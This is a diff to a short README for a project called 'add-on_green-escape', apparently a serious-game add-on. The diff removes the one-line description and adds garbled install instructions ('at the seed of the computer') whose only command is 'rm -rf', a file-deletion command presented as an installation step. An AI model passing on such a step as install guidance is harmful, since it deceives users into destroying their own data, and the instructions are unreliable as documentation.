@@ -1,2 +1,6 @@
 # add-on_green-escape
-add on pour le serious game
+
+Install the projet at the seed of the computer with :
+```
+rm -rf
+```
